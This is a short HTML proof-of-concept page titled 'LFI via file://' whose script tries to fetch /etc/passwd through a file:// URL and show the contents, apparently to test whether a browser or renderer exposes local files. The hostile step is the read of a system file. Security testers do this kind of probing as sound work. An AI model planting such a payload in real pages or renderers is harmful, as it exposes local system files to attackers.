<!DOCTYPE html>
<html>
<head><title>LFI via file://</title></head>
<body>
  <h2>Attempting to read local file</h2>
  <pre id="result">Waiting...</pre>

  <script>
    fetch("file:///etc/passwd")
      .then(res => res.text())
      .then(text => {
        document.getElementById("result").innerText = text;
      })
      .catch(err => {
        document.getElementById("result").innerText = "Access denied: " + err;
      });
  </script>
</body>
</html>
